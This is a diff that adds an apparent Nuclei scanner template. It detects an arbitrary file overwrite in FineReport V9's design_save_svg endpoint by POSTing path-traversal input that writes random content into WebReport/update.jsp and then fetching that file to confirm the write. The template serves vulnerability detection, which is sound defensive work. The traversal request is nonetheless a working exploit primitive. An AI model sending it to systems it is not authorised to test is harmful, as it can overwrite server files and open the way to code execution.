@@ -1,0 +1,39 @@
+id: finereport-v9-design-save-svg-anyfile-coverage
+info:
+  name: Finereport V9 design_save_svg Arbitrary File Overwrite
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+http:
+  - raw:
+      - |
+        POST /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/update.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"__CONTENT__":"{{random_content}}"}
+    extractors:
+      - type: regex
+        name: uploaded-content
+        part: body
+        regex:
+          - "{{random_content}}"
+        internal: true
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /WebReport/update.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{random_content}}"
+variables:
+  random_content: '{{base64(rand_text_alphanumeric(4))}}'
